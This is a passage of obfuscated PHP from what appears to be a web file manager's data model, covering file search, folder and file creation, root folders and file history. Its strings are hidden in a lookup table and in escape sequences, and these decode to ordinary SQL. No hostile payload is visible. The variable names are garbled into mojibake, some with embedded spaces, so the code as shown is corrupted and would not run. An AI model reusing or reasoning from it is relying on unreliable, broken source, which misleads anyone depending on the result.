($ê‡è„Ø•[$”Í³áŠ[375]] as $çÀäâ ²) { $Â½—¸Üñ = $çÀäâ ²[$”Í³áŠ[42]]; $ÊœÙáğÖ = str_replace($”Í³áŠ[63], $”Í³áŠ[12], Pinyin::get($Â½—¸Üñ)); if (stripos($Â½—¸Üñ, $äüÒ) !== !1 || stripos($ÊœÙáğÖ, $äüÒ) !== !1) { $áÀö¾š[] = $çÀäâ ²[$”Í³áŠ[403]]; } } if (!$áÀö¾š) { return; } $áÃÙÃÏá = array($”Í³áŠ[429] => array($”Í³áŠ[7], $áÀö¾š), $”Í³áŠ[1632] => 0, $”Í³áŠ[43] => $”Í³áŠ[1913] . $ö¢³èğ¡); $Ã»òËçë = Model($”Í³áŠ[430])->field($”Í³áŠ[88])->where($áÃÙÃÏá)->select(); $Ã»òËçë = array_to_keyvalue($Ã»òËçë, $”Í³áŠ[12], $”Í³áŠ[88]); $³ê×ı = array_unique($Ã»òËçë); $this->_listSearchMerge($ƒĞÄ’„Å, $­½èÙ, $½¸ªÅµ, $³ê×ı); } private function _listSearchMerge(&$ğÃÁÌıè, $Ñ—ƒÌÑª, $Ò·Î«ğ…, $‡ğûŸ®æ) { $˜ÇĞŒ =& $_SERVER[ë¦»ºéÌ]; if (!$‡ğûŸ®æ) { return; } $ÍØığˆ¬ = array_to_keyvalue($ğÃÁÌıè[$˜ÇĞŒ[375]], $˜ÇĞŒ[12], $˜ÇĞŒ[405]); $„Ãöüìî = array_diff($‡ğûŸ®æ, $ÍØığˆ¬); if (!$„Ãöüìî) { return; } $Ú°«çñ® = array($˜ÇĞŒ[405] => array($˜ÇĞŒ[7], $„Ãöüìî)); $çáèËÁ— = $this->field($Ò·Î«ğ…)->where($Ú°«çñ®)->select(); if (!$çáèËÁ—) { return; } $ÙÁÅ°…ì = array(); foreach ($çáèËÁ— as $¬±ã­€) { if ($this->_listSearchFilter($¬±ã­€, $Ñ—ƒÌÑª)) { $ÙÁÅ°…ì[] = $¬±ã­€; } } $ğÃÁÌıè[$˜ÇĞŒ[375]] = array_merge($ÙÁÅ°…ì, $ğÃÁÌıè[$˜ÇĞŒ[375]]); $ğÃÁÌıè[$˜ÇĞŒ[372]][$˜ÇĞŒ[373]] += count($ÙÁÅ°…ì); } private function _listSearchFilter($±†úƒõ›, $ªâ±Ÿ×â) { $”ƒçÆçğ =& $_SERVER[ë¦»ºéÌ]; $È°ªÎÜ = $±†úƒõ›[$”ƒçÆçğ[413]] == $”ƒçÆçğ[99]; if (!strstr($±†úƒõ›[$”ƒçÆçğ[523]], $”ƒçÆçğ[60] . $ªâ±Ÿ×â[$”ƒçÆçğ[500]] . $”ƒçÆçğ[60])) { return !1; } if (isset($ªâ±Ÿ×â[$”ƒçÆçğ[415]]) && $ªâ±Ÿ×â[$”ƒçÆçğ[415]] != $”ƒçÆçğ[1854]) { if ($ªâ±Ÿ×â[$”ƒçÆçğ[415]] == $”ƒçÆçğ[89] && !$È°ªÎÜ) { return !1; } if ($ªâ±Ÿ×â[$”ƒçÆçğ[415]] != $”ƒçÆçğ[89] && $È°ªÎÜ) { return !1; } if (!strstr($±†úƒõ›[$”ƒçÆçğ[179]], $”ƒçÆçğ[60] . $ªâ±Ÿ×â[$”ƒçÆçğ[415]] . $”ƒçÆçğ[60])) { return !1; } } if (isset($ªâ±Ÿ×â[$”ƒçÆçğ[2051]]) && $ªâ±Ÿ×â[$”ƒçÆçğ[2051]] < $±†úƒõ›[$”ƒçÆçğ[90]]) { return !1; } if (isset($ªâ±Ÿ×â[$”ƒçÆçğ[2052]]) && $ªâ±Ÿ×â[$”ƒçÆçğ[2052]] > $±†úƒõ›[$”ƒçÆçğ[90]]) { return !1; } if (isset($ªâ±Ÿ×â[$”ƒçÆçğ[596]]) && $ªâ±Ÿ×â[$”ƒçÆçğ[596]] != $±†úƒõ›[$”ƒçÆçğ[456]]) { return !1; } return !0; } public function listSearchChildren($˜ÅÁêçÃ, $Å‘¬‡×» = 5000) { $’º¸ÕÕ¢ =& $_SERVER[ë¦»ºéÌ]; $¬É§÷ÈÚ = array(); $•İ÷Ä˜İ = $this->sourceInfo($˜ÅÁêçÃ); $¿‹úĞ¾ö = array($’º¸ÕÕ¢[523] => array($’º¸ÕÕ¢[389], $•İ÷Ä˜İ[$’º¸ÕÕ¢[523]] . $•İ÷Ä˜İ[$’º¸ÕÕ¢[405]] . $’º¸ÕÕ¢[547])); $æûœñãÇ = $this->field($’º¸ÕÕ¢[90])->where($¿‹úĞ¾ö)->limit($Å‘¬‡×» + 1)->select(); $û€‰æø„ = is_array($æûœñãÇ) ? count($æûœñãÇ) : 0; if ($û€‰æø„ > $Å‘¬‡×») { return $this->_listSearchChildrenNear($˜ÅÁêçÃ, $Å‘¬‡×»); } $­Ü­ƒ¥ê = $this->field($’º¸ÕÕ¢[405])->where($¿‹úĞ¾ö)->select(); $¬É§÷ÈÚ = array_to_keyvalue($­Ü­ƒ¥ê, $’º¸ÕÕ¢[12], $’º¸ÕÕ¢[405]); return $¬É§÷ÈÚ; } private function _listSearchChildrenNear($™ßòŠ», $ø¦ÍÀ³) { $ƒÛ£Îíİ =& $_SERVER[ë¦»ºéÌ]; $…Òé´Ì´ = array(); $‹°¤£ = array($ƒÛ£Îíİ[500] => $™ßòŠ»); $ú²åÁ½ = $this->field($ƒÛ£Îíİ[2053])->where($‹°¤£)->select(); $¿Ãğìó = array_to_keyvalue(array_filter_by_field($ú²åÁ½, $ƒÛ£Îíİ[413], $ƒÛ£Îíİ[99]), $ƒÛ£Îíİ[12], $ƒÛ£Îíİ[405]); $…Òé´Ì´ = array_merge($…Òé´Ì´, array_to_keyvalue($ú²åÁ½, $ƒÛ£Îíİ[12], $ƒÛ£Îíİ[405])); if (!$¿Ãğìó) { return $…Òé´Ì´; } $‹°¤£ = array($ƒÛ£Îíİ[500] => array($ƒÛ£Îíİ[7], $¿Ãğìó)); $ú²åÁ½ = $this->field($ƒÛ£Îíİ[2053])->where($‹°¤£)->limit($ø¦ÍÀ³)->select(); $…Òé´Ì´ = array_merge($…Òé´Ì´, array_to_keyvalue($ú²åÁ½, $ƒÛ£Îíİ[12], $ƒÛ£Îíİ[405])); $…Òé´Ì´ = array_slice($…Òé´Ì´, 0, $ø¦ÍÀ³); return $…Òé´Ì´; } private function _listSearchBindPinyin($¬Ö¸©ë°, &$€çÀ ¶È, &$ıÙÊãŠ¾) { $ğØ†¡Ã =& $_SERVER[ë¦»ºéÌ]; if (!isset($¬Ö¸©ë°[$ğØ†¡Ã[1891]]) || !$¬Ö¸©ë°[$ğØ†¡Ã[1891]]) { return; } if (!Input::check($¬Ö¸©ë°[$ğØ†¡Ã[1891]], $ğØ†¡Ã[324]) || strlen($¬Ö¸©ë°[$ğØ†¡Ã[1891]]) < 2) { return; } $¨ ¾›²¡ = "\x4c\x45\x46\124\x20\112\117\x49\116\40{$this->tablePrefix}\151\157\x5f\163\x6f\x75\162\x63\x65\137\155\145\x74\141\x20\x6d\145\x74\141\40\x6f\x6e\x20\x73\157\165\162\143\x65\x2e\x73\x6f\165\x72\x63\145\111\x44\40\x3d\40\155\145\x74\x61\56\163\157\x75\x72\x63\145\111\104"; $Çê“½¼¥ = array(); $ıÙÊãŠ¾ = str_replace(array($ğØ†¡Ã[18], $ğØ†¡Ã[63], $ğØ†¡Ã[2054]), $ğØ†¡Ã[12], $ıÙÊãŠ¾); $ıÙÊãŠ¾ = $ğØ†¡Ã[438] . str_replace($ğØ†¡Ã[60], $ğØ†¡Ã[439], $ıÙÊãŠ¾); $î“öİàº = $€çÀ ¶È[$ğØ†¡Ã[42]]; unset($€çÀ ¶È[$ğØ†¡Ã[42]]); foreach ($€çÀ ¶È as $«»Ô»š© => $€ö˜Èï) { $Çê“½¼¥[$ğØ†¡Ã[438] . $«»Ô»š©] = $€ö˜Èï; } foreach ($î“öİàº as $ê‚”²Šô) { $Çê“½¼¥[] = array($ğØ†¡Ã[443] => $ê‚”²Šô, $ğØ†¡Ã[980] => $ğØ†¡Ã[1895], array($ğØ†¡Ã[2055] => $ê‚”²Šô, $ğØ†¡Ã[2056] => array($ğØ†¡Ã[7], array($ğØ†¡Ã[466], $ğØ†¡Ã[465])))); } $this->join($¨ ¾›²¡); $€çÀ ¶È = $Çê“½¼¥; } private function _parseSearchWhere($úñó§) { $ğµÄæÌµ =& $_SERVER[ë¦»ºéÌ]; $®¤«Êø™ = array(); if (isset($úñó§[$ğµÄæÌµ[745]]) && $úñó§[$ğµÄæÌµ[745]]) { $®¤«Êø™[$ğµÄæÌµ[96]] = array($ğµÄæÌµ[2057], $úñó§[$ğµÄæÌµ[745]]); } if (isset($úñó§[$ğµÄæÌµ[498]]) && $úñó§[$ğµÄæÌµ[498]]) { $òÊ‹“´Ä = array($ğµÄæÌµ[2058], $úñó§[$ğµÄæÌµ[498]]); if ($®¤«Êø™[$ğµÄæÌµ[96]]) { $®¤«Êø™[$ğµÄæÌµ[96]] = array($®¤«Êø™[$ğµÄæÌµ[96]], $òÊ‹“´Ä, $ğµÄæÌµ[2059]); } else { $®¤«Êø™[$ğµÄæÌµ[96]] = $òÊ‹“´Ä; } } if (isset($úñó§[$ğµÄæÌµ[2051]]) && $úñó§[$ğµÄæÌµ[2051]] > 0) { $®¤«Êø™[$ğµÄæÌµ[90]] = array($ğµÄæÌµ[2057], $úñó§[$ğµÄæÌµ[2051]]); } if (isset($úñó§[$ğµÄæÌµ[2052]]) && $úñó§[$ğµÄæÌµ[2052]]) { $òÊ‹“´Ä = array($ğµÄæÌµ[2058], $úñó§[$ğµÄæÌµ[2052]]); if ($®¤«Êø™[$ğµÄæÌµ[90]]) { $®¤«Êø™[$ğµÄæÌµ[90]] = array($®¤«Êø™[$ğµÄæÌµ[90]], $òÊ‹“´Ä, $ğµÄæÌµ[2059]); } else { $®¤«Êø™[$ğµÄæÌµ[90]] = $òÊ‹“´Ä; } } if (isset($úñó§[$ğµÄæÌµ[596]]) && $úñó§[$ğµÄæÌµ[596]]) { $®¤«Êø™[] = array($ğµÄæÌµ[456] => $úñó§[$ğµÄæÌµ[596]], $ğµÄæÌµ[454] => $úñó§[$ğµÄæÌµ[596]], $ğµÄæÌµ[980] => $ğµÄæÌµ[1895]); } if (isset($úñó§[$ğµÄæÌµ[415]]) && $úñó§[$ğµÄæÌµ[415]]) { $¼º¯‡Ğ­ = $úñó§[$ğµÄæÌµ[415]]; if ($¼º¯‡Ğ­ == $ğµÄæÌµ[89]) { $®¤«Êø™[$ğµÄæÌµ[413]] = 1; } else { if ($¼º¯‡Ğ­ == $ğµÄæÌµ[2060]) { $®¤«Êø™[$ğµÄæÌµ[413]] = 0; } else { if ($¼º¯‡Ğ­) { $¼º¯‡Ğ­ = is_array($¼º¯‡Ğ­) ? $¼º¯‡Ğ­ : explode($ğµÄæÌµ[60], $¼º¯‡Ğ­); $®¤«Êø™[$ğµÄæÌµ[415]] = array($ğµÄæÌµ[421], $¼º¯‡Ğ­); $®¤«Êø™[$ğµÄæÌµ[413]] = 0; } } } } $this->_parseSearchParent($úñó§, $®¤«Êø™); if (isset($úñó§[$ğµÄæÌµ[1891]]) && trim($úñó§[$ğµÄæÌµ[1891]])) { $¨º°æ¬» = trim($úñó§[$ğµÄæÌµ[1891]]); $ÈˆùÒÆÃ = explode($ğµÄæÌµ[63], $¨º°æ¬»); if (strlen($¨º°æ¬») > 2 && (substr($¨º°æ¬», 0, 1) == $ğµÄæÌµ[129] && substr($¨º°æ¬», -1) == $ğµÄæÌµ[129]) || substr($¨º°æ¬», 0, 1) == $ğµÄæÌµ[68] && substr($¨º°æ¬», -1) == $ğµÄæÌµ[68]) { $¨º°æ¬» = substr($¨º°æ¬», 1, -1); $ÈˆùÒÆÃ = array($¨º°æ¬»); } $®¤«Êø™[$ğµÄæÌµ[42]] = array(array($ğµÄæÌµ[546], $ğµÄæÌµ[1893] . $¨º°æ¬» . $ğµÄæÌµ[1893])); if (count($ÈˆùÒÆÃ) > 1) { $®¤«Êø™[$ğµÄæÌµ[42]] = array(); foreach ($ÈˆùÒÆÃ as $Í‰¯·Ãó) { if (!trim($Í‰¯·Ãó)) { continue; } $®¤«Êø™[$ğµÄæÌµ[42]][] = array($ğµÄæÌµ[546], $ğµÄæÌµ[1893] . trim($Í‰¯·Ãó) . $ğµÄæÌµ[1893]); } } } return $®¤«Êø™; } private function _parseSearchParent($†–ü—°Æ, &$åôë¢¿¬) { $™È”ßµ£ =& $_SERVER[ë¦»ºéÌ]; if (!isset($†–ü—°Æ[$™È”ßµ£[500]]) || !$†–ü—°Æ[$™È”ßµ£[500]]) { return; } $ô•íÄŸÄ = $this->pathInfo($†–ü—°Æ[$™È”ßµ£[500]]); $Êõ£Ø¿ = $ô•íÄŸÄ[$™È”ßµ£[500]] . $™È”ßµ£[12] === $™È”ßµ£[202]; $©€‰´ªÅ = $ô•íÄŸÄ[$™È”ßµ£[414]] == $™È”ßµ£[517]; $åôë¢¿¬[$™È”ßµ£[586]] = array($™È”ßµ£[546], $ô•íÄŸÄ[$™È”ßµ£[523]] . $†–ü—°Æ[$™È”ßµ£[500]] . $™È”ßµ£[547]); $Å´Ì“ì¥ = isset($†–ü—°Æ[$™È”ßµ£[1759]]) && in_array($™È”ßµ£[517], $†–ü—°Æ[$™È”ßµ£[1759]]); if (!$Å´Ì“ì¥ || !$©€‰´ªÅ || !$Êõ£Ø¿ || !$ô•íÄŸÄ[$™È”ßµ£[416]]) { return; } if (!AuthModel::authCheckRoot($ô•íÄŸÄ[$™È”ßµ£[416]][$™È”ßµ£[417]])) { return; } $Š’÷ù¢é = $ô•íÄŸÄ[$™È”ßµ£[506]] . $™È”ßµ£[12]; if ($Š’÷ù¢é == $™È”ßµ£[99]) { unset($åôë¢¿¬[$™È”ßµ£[586]]); $åôë¢¿¬[$™È”ßµ£[414]] = self::TYPE_GROUP; return; } $¨—Å¢Üˆ = Model($™È”ßµ£[524])->groupChildrenAll($Š’÷ù¢é); $ù¥‚üÅĞ = count($¨—Å¢Üˆ); if ($ù¥‚üÅĞ <= 1) { return; } $ó»³—š… = array($™È”ßµ£[500] => 0, $™È”ßµ£[414] => self::TYPE_GROUP, $™È”ßµ£[506] => array($™È”ßµ£[7], $¨—Å¢Üˆ)); $öœáú›š = $this->field($™È”ßµ£[2061])->where($ó»³—š…)->limit($ù¥‚üÅĞ)->select(); $åôë¢¿¬[$™È”ßµ£[586]] = array(); foreach ($öœáú›š as $Î©âæÄ) { $åôë¢¿¬[$™È”ßµ£[586]][] = array($™È”ßµ£[546], $™È”ßµ£[533] . $Î©âæÄ[$™È”ßµ£[405]] . $™È”ßµ£[547]); } $åôë¢¿¬[$™È”ßµ£[586]][] = $™È”ßµ£[1895]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Ï€é±) { $›ë­§ûà =& $_SERVER[ë¦»ºéÌ]; $¡›¢ ñµ = Model($›ë­§ûà[515])->where(array($›ë­§ûà[1623] => $Ï€é±))->find(); $¤‘äóÂö = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ï€é±, $¡›¢ ñµ[$›ë­§ûà[42]]); $this->userDesktopAdd($¤‘äóÂö); return $¤‘äóÂö; } public function userDesktopAdd($‡ÓâÜú) { $ÛÌÆ§ıò =& $_SERVER[ë¦»ºéÌ]; $Ôíğ¢õ = LNG($ÛÌÆ§ıò[2062]); $İÒ€¿‡Ü = $this->mkdir($‡ÓâÜú, $Ôíğ¢õ); $this->metaSet($İÒ€¿‡Ü, $ÛÌÆ§ıò[2063], $ÛÌÆ§ıò[99]); $this->metaSet($‡ÓâÜú, $ÛÌÆ§ıò[2064], $İÒ€¿‡Ü); } public function groupRootAdd($µ¼È½å) { $›èß¯šë =& $_SERVER[ë¦»ºéÌ]; $Èİ§Óœ = Model($›èß¯šë[524])->where(array($›èß¯šë[1887] => $µ¼È½å))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $µ¼È½å, $Èİ§Óœ[$›èß¯šë[42]]); } public function systemRootPathAdd($×š Ï®) { if ($×š Ï® != $_SERVER[ë¦»ºéÌ][539]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $×š Ï®); } public function userRootRemove($ô¦²ùÖœ) { $‰¹×¯ÉÊ = $this->sourceRoot(SourceModel::TYPE_USER, $ô¦²ùÖœ); if (!$‰¹×¯ÉÊ) { return; } $this->remove($‰¹×¯ÉÊ, !1); } public function groupRootRemove($Ê±òúá¬) { $®¶ı‡û = $this->sourceRoot(SourceModel::TYPE_GROUP, $Ê±òúá¬); if (!$®¶ı‡û) { return; } $this->remove($®¶ı‡û, !1); } private function _mkdirRoot($ªú›ùĞ, $ÌÏåÜà, $§„îÁ¸Ï) { $ŸÂŞ‰µÄ =& $_SERVER[ë¦»ºéÌ]; $å«‘ú’æ = array($ŸÂŞ‰µÄ[404] => 0, $ŸÂŞ‰µÄ[582] => $ªú›ùĞ, $ŸÂŞ‰µÄ[583] => $ÌÏåÜà, $ŸÂŞ‰µÄ[579] => 1, $ŸÂŞ‰µÄ[584] => USER_ID, $ŸÂŞ‰µÄ[585] => USER_ID, $ŸÂŞ‰µÄ[580] => $ŸÂŞ‰µÄ[12], $ŸÂŞ‰µÄ[586] => $ŸÂŞ‰µÄ[533], $ŸÂŞ‰µÄ[432] => 0, $ŸÂŞ‰µÄ[581] => 0, $ŸÂŞ‰µÄ[470] => 0, $ŸÂŞ‰µÄ[587] => $ŸÂŞ‰µÄ[12]); if ($ä –ëø¬ = $this->where($å«‘ú’æ)->find()) { return $ä –ëø¬[$ŸÂŞ‰µÄ[405]]; } $¼²Îì³Ÿ = "\115\157\x64\145\x6c\x53\x6f\165\x72\x63\x65\x2e\x6d\153\144\151\x72\x52\x6f\157\x74\56{$ªú›ùĞ}\x2e{$ÌÏåÜà}\56" . $§„îÁ¸Ï; CacheLock::lock($¼²Îì³Ÿ); $å«‘ú’æ[$ŸÂŞ‰µÄ[42]] = $§„îÁ¸Ï; $¯ìÁ§óâ = $this->add($å«‘ú’æ); $˜·ıœ“ = array($ŸÂŞ‰µÄ[588] => short_id($¯ìÁ§óâ)); $this->where(array($ŸÂŞ‰µÄ[420] => $¯ìÁ§óâ))->save($˜·ıœ“); CacheLock::unlock($¼²Îì³Ÿ); return $¯ìÁ§óâ; } private function sourceRoot($îşùúôİ, $ïá¹‡Æ‹, $Ìêñ ’Ã = false) { $ÔµŸ¥Õ =& $_SERVER[ë¦»ºéÌ]; $Ò›ÎúÃ¼ = array($ÔµŸ¥Õ[404] => 0, $ÔµŸ¥Õ[582] => $îşùúôİ, $ÔµŸ¥Õ[583] => $ïá¹‡Æ‹); if ($¾´‚®Û‘ = $this->where($Ò›ÎúÃ¼)->find()) { return $Ìêñ ’Ã ? $¾´‚®Û‘ : $¾´‚®Û‘[$ÔµŸ¥Õ[405]]; } return !1; } public function sourceRootGroup($Äœå‚‡â) { $úÀ£íÎÉ =& $_SERVER[ë¦»ºéÌ]; if (is_string($Äœå‚‡â)) { $Äœå‚‡â = array($Äœå‚‡â); } $£Ææò’¡ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $Äœå‚‡â, $úÀ£íÎÉ[193]); $Ô»­¨™˜ = array($úÀ£íÎÉ[375] => $£Ææò’¡, $úÀ£íÎÉ[372] => array($úÀ£íÎÉ[743] => count($Äœå‚‡â))); $this->_listDataApply($Ô»­¨™˜[$úÀ£íÎÉ[375]]); $this->_listMake($Ô»­¨™˜); return array_to_keyvalue($Ô»­¨™˜[$úÀ£íÎÉ[87]], $úÀ£íÎÉ[506]); } public function mkfile($Ç¼´Šª», $ªÊùéœì, $¬àŸšÑ = '', $ŸÊÁÈÚ = REPEAT_RENAME) { $š¥¸ºÌı =& $_SERVER[ë¦»ºéÌ]; $ÒÄ«¥½ı = Model($š¥¸ºÌı[605])->addFileByContent($¬àŸšÑ, $ªÊùéœì); return $this->_createFileCall($Ç¼´Šª», $ªÊùéœì, $ÒÄ«¥½ı, $ŸÊÁÈÚ, $š¥¸ºÌı[1316]); } public function addFile($ü‚˜Œı, $¯Î‹Ã›ô, $³”ëşÙ, $ØÀûİ• = false, $ÍÃóåÙ° = REPEAT_RENAME) { $±ø¼ƒÁ¼ = Model($_SERVER[ë¦»ºéÌ][605])->addFile($¯Î‹Ã›ô, $³”ëşÙ, $ØÀûİ•); return $this->_createFileCall($ü‚˜Œı, $³”ëşÙ, $±ø¼ƒÁ¼, $ÍÃóåÙ°); } public function addFileByFileID($„››á£·, $à·¢å¸, $ñÌú‡œ, $öïÈ¾Ûƒ = REPEAT_RENAME) { $±´‡€ÔÕ =& $_SERVER[ë¦»ºéÌ]; $·µ¥ü’Ş = Model($±´‡€ÔÕ[605])->find($à·¢å¸); Model($±´‡€ÔÕ[605])->linkAdd($à·¢å¸); return $this->_createFileCall($„››á£·, $ñÌú‡œ, $·µ¥ü’Ş, $öïÈ¾Ûƒ); } public function addFileByRemote($´ï‘¿¸æ, $åÙ©Çâ•, $ÀûÍ©îÖ, $œèã¶‡í = array(), $œ¹šŸ«‰ = REPEAT_RENAME) { $ˆª¾¶‡Õ = Model($_SERVER[ë¦»ºéÌ][605])->addFileByRemote($åÙ©Çâ•, $ÀûÍ©îÖ, $œèã¶‡í); return $this->_createFileCall($´ï‘¿¸æ, $ÀûÍ©îÖ, $ˆª¾¶‡Õ, $œ¹šŸ«‰); } private function _createFileCall($¹İ™ŞÊŒ, $ıîßÒÉ«, $ÂÊÀÔ¾, $Â¨Ùªä¾, $úªëÎ»¥ = "\165\x70\x6c\x6f\x61\144") { $àŞŸÄ…Æ =& $_SERVER[ë¦»ºéÌ]; $ŞÊ©×Ôß = !1; $this->setMasterDB(); $this->lockWriteStart($¹İ™ŞÊŒ, $ıîßÒÉ«); $øËÈ¯©› = $this->fileNameExist($¹İ™ŞÊŒ, $ıîßÒÉ«); $šƒå²Ï— = $this->_createFile($¹İ™ŞÊŒ, $ıîßÒÉ«, $ÂÊÀÔ¾, $Â¨Ùªä¾, $ŞÊ©×Ôß); if (!$ŞÊ©×Ôß) { Model($àŞŸÄ…Æ[472])->remove($ÂÊÀÔ¾[$àŞŸÄ…Æ[469]]); } if ($ŞÊ©×Ôß && $šƒå²Ï— && $šƒå²Ï— != $øËÈ¯©›) { Model($àŞŸÄ…Æ[2035])->eventCreate($šƒå²Ï—, $úªëÎ»¥); } $this->lockWriteEnd($¹İ™ŞÊŒ, $ıîßÒÉ«); return $šƒå²Ï—; } public function mkdir($ìå´ÅÑ¶, $˜›£şæ, $ÊÊ²àÏ¹ = REPEAT_SKIP) { $É‚æ«» =& $_SERVER[ë¦»ºéÌ]; $this->setMasterDB(); $ø†°ü®¤ = $this->sourceInfo($ìå´ÅÑ¶); if (!$ø†°ü®¤) { return !1; } $this->lockWriteStart($ìå´ÅÑ¶, $˜›£şæ); if ($ÊÊ²àÏ¹ !== !1) { $¼é—ëá¾ = $this->fileNameExist($ìå´ÅÑ¶, $˜›£şæ); if ($¼é—ëá¾ && $ÊÊ²àÏ¹ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ìå´ÅÑ¶, $˜›£şæ); return $¼é—ëá¾; } $˜›£şæ = $this->fileNameAuto($ìå´ÅÑ¶, $˜›£şæ, $ÊÊ²àÏ¹); } $Øø‹Ù¥â = array($É‚æ«»[579] => 1, $É‚æ«»[423] => $˜›£şæ, $É‚æ«»[580] => $É‚æ«»[12], $É‚æ«»[470] => 0, $É‚æ«»[581] => 0); $­•øÑ–å = $this->_addSource($Øø‹Ù¥â, $ø†°ü®¤); Model($É‚æ«»[2035])->eventCreate($­•øÑ–å, $É‚æ«»[1317]); $this->lockWriteEnd($ìå´ÅÑ¶, $˜›£şæ); return $­•øÑ–å; } public function listSourceRoot($ûÜƒã€ª, $¸Ñ‰‰ø€, $åÄ£™¾ = "\163\x6f\x75\162\143\145\x49\x44\54\164\x61\x72\x67\145\x74\111\104\x2c\x73\x69\x7a\x65") { $€×²á±İ =& $_SERVER[ë¦»ºéÌ]; $™ŒÉùã• = $€×²á±İ[384]; $²²ô˜„¯ = array(); $Ûú‹÷ö = 1024 * 50; $ÂÎŒÒÎÉ = is_array($ÂÎŒÒÎÉ) ? $ÂÎŒÒÎÉ : array(); $’ĞªëÛà = count($¸Ñ‰‰ø€); $€ŒŒ§Å = $this->tablePrefix . $€×²á±İ[2065]; for ($Ù‡¸Ø¥ = 0; $Ù‡¸Ø¥ < $’ĞªëÛà; $Ù‡¸Ø¥++) { $Éôˆıü = $¸Ñ‰‰ø€[$Ù‡¸Ø¥]; $™ŒÉùã• .= "\123\x45\x4c\x45\x43\x54\40\x2a\40\106\122\117\115\x20\50\123\105\114\x45\x43\x54\x20{$åÄ£™¾}\x20\106\x52\117\x4d\40\x60{$€ŒŒ§Å}\140\x20\127\x48\x45\122\105\x20"; $™ŒÉùã• .= "\x60\x70\141\x72\145\x6e\164\111\104\140\x3d\x30\40\x41\x4e\104\x20\140\164\x61\162\147\145\164\111\x44\140\x3d{$Éôˆıü}\x20\101\116\104\40\x60\164\141\x72\x67\x65\x74\124\x79\x70\145\x60\x3d{$ûÜƒã€ª}\x20\x6c\x69\155\x69\x74\40\61\x29\x20\x61\x73\40\x74\142\137{$Ù‡¸Ø¥}\40\125\116\111\117\x4e\40\x41\x4c\x4c\40"; if ((strlen($™ŒÉùã•) >= $Ûú‹÷ö || $Ù‡¸Ø¥ == $’ĞªëÛà - 1) && $™ŒÉùã•) { $™ŒÉùã• = substr($™ŒÉùã•, 0, -strlen($€×²á±İ[1018])); $§ı¥—ãÜ = $this->query($™ŒÉùã•); $™ŒÉùã• = $€×²á±İ[12]; $²²ô˜„¯ = array_merge($²²ô˜„¯, $§ı¥—ãÜ); } } return $²²ô˜„¯; } private function _createFile($ÔöŞ´ã¤, $§®œ³ø¬, $©ê øıĞ, $‰¬„÷³Ş, &$ÛŞÆİÅë) { $×š¤¤üã =& $_SERVER[ë¦»ºéÌ]; $¢ÚÀª³Œ = $this->sourceInfo($ÔöŞ´ã¤); if (!$©ê øıĞ || !$¢ÚÀª³Œ) { return !1; } if ($‰¬„÷³Ş !== !1) { $éîòĞî¼ = $this->fileNameExist($ÔöŞ´ã¤, $§®œ³ø¬); } $ÛŞÆİÅë = !0; if ($‰¬„÷³Ş && $éîòĞî¼) { if ($‰¬„÷³Ş == REPEAT_SKIP) { $ÛŞÆİÅë = !1; return $éîòĞî¼; } else { if ($‰¬„÷³Ş == REPEAT_REPLACE) { $´¿ô¨å¶ = $this->sourceInfo($éîòĞî¼); $ŞœÂÊÛ¾ = $this->fileHistory($´¿ô¨å¶, $©ê øıĞ[$×š¤¤üã[469]], $©ê øıĞ[$×š¤¤üã[90]]); if (!$ŞœÂÊÛ¾) { $ÛŞÆİÅë = !1; } else { $this->folderSizeReset($ÔöŞ´ã¤); } return $éîòĞî¼; } else { $§®œ³ø¬ = $this->fileNameAuto($ÔöŞ´ã¤, $§®œ³ø¬, $‰¬„÷³Ş, !1); } } } $ÓíÜº = array($×š¤¤üã[579] => 0, $×š¤¤üã[423] => $§®œ³ø¬, $×š¤¤üã[580] => substr(get_path_ext($§®œ³ø¬), 0, 10), $×š¤¤üã[470] => $©ê øıĞ[$×š¤¤üã[469]], $×š¤¤üã[581] => $©ê øıĞ[$×š¤¤üã[90]]); $ÊğşÙ• = $this->_addSource($ÓíÜº, $¢ÚÀª³Œ); $this->folderSizeReset($ÔöŞ´ã¤, intval($ÓíÜº[$×š¤¤üã[90]])); return $ÊğşÙ•; } protected function fileHistory($½ŠıÈşœ, $ãœ‰âìÆ, $ºØ’î¤¨) { $›ÏÚİêŞ =& $_SERVER[ë¦»ºéÌ]; $†Ñè†Ø÷ = defined($›ÏÚİêŞ[476]) ? USER_ID : $›ÏÚİêŞ[202]; if ($½ŠıÈşœ[$›ÏÚİêŞ[469]] == $ãœ‰âìÆ) { return !1; } $this->checkLock($½ŠıÈşœ[$›ÏÚİêŞ[405]], $ãœ‰âìÆ); Model($›ÏÚİêŞ[2066])->addHistory($½ŠıÈşœ); $˜»Æ¤ú„ = array($›ÏÚİêŞ[585] => $†Ñè†Ø÷, $›ÏÚİêŞ[427] => time(), $›ÏÚİêŞ[469] => $ãœ‰âìÆ, $›ÏÚİêŞ[90] => $ºØ’î¤¨); $this->where(array($›ÏÚİêŞ[420] => $½ŠıÈşœ[$›ÏÚİêŞ[405]]))->save($˜»Æ¤ú„); $this->sourceCacheClear($½ŠıÈşœ[$›ÏÚİêŞ[405]]); return !0; } public function checkLock($ûãÕèêì, $á¨ÆĞ¼¥) { $ÂÉ¿”§ =& $_SERVER[ë¦»ºéÌ]; $ÜÈÕ¦µ = $this->pathInfo($ûãÕèêì); if (!$this->fileIsLock($ÜÈÕ¦µ, !0)) { return; } $ç°ëê¯ = Session::get($ÂÉ¿”§[2067]); $™õÑâ¾ = substr($ÜÈÕ¦µ[$ÂÉ¿”§[42]], 0, -1 - strlen($ÜÈÕ¦µ[$ÂÉ¿”§[179]])) . $ÂÉ¿”§[1581] . $ç°ëê¯ . $ÂÉ¿”§[10] . $ÜÈÕ¦µ[$ÂÉ¿”§[179]]; $˜‰£àèÜ = Model($ÂÉ¿”§[605])->find($á¨ÆĞ¼¥); $this->_createFileCall($ÜÈÕ¦µ[$ÂÉ¿”§[500]], $™õÑâ¾, $˜‰£àèÜ, REPEAT_REPLACE, $ÂÉ¿”§[1316]); $“‹‡·òİ = $ÜÈÕ¦µ[$ÂÉ¿”§[467]][$ÂÉ¿”§[544]]; $Ã…°ƒ«Æ = $“‹‡·òİ[$ÂÉ¿”§[2068]] ? $“‹‡·òİ[$ÂÉ¿”§[2068]] : $“‹‡·òİ[$ÂÉ¿”§[42]]; 